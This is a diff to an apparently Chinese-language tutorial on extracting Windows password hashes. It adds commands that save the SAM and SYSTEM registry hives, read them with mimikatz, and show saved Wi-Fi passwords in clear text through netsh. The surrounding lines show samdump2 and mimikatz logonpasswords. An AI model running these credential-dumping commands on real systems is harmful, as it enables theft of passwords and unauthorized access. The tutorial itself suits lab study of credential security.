@@ -30,8 +30,12 @@ Windows的登录密码的hash值保存在SAM文件中，SAM是“security accoun
 ```
 SAM文件被Windows保护，不能直接读取，需借助工具，如[SAMInside](http://www.insidepro.com/download/saminside.zip)。找一台Windows7虚拟机，新建一个名为hashcat的管理员用户，并设置密码，在Windows7中下载并解压SAMInside后以管理员权限运行，然后点击File->Import Local Users vis Scheduler，如下图所示：
 ```css
+//导出 SAM 和 System 文件：通过 reg 的注册表导出
 reg save hklm\sam sam.hive 
 reg save hklm\system system.hive
+move 移动文件
+//使用mimikatz读取SAM和System文件
+lsadump::sam /sam:sam.hive /system:system.hive
 ```
 ```css
 samdump2 system.hive sam.hive > hash.txt
@@ -100,6 +104,12 @@ privilege::debug
 ##抓取密码
 sekurlsa::logonpasswords
 
+```
+
+wifi密码抓取
+```css
+netsh wlan show profile 
+netsh wlan show profile name="ssid" KEY=clear
 ```
 
 参考链接
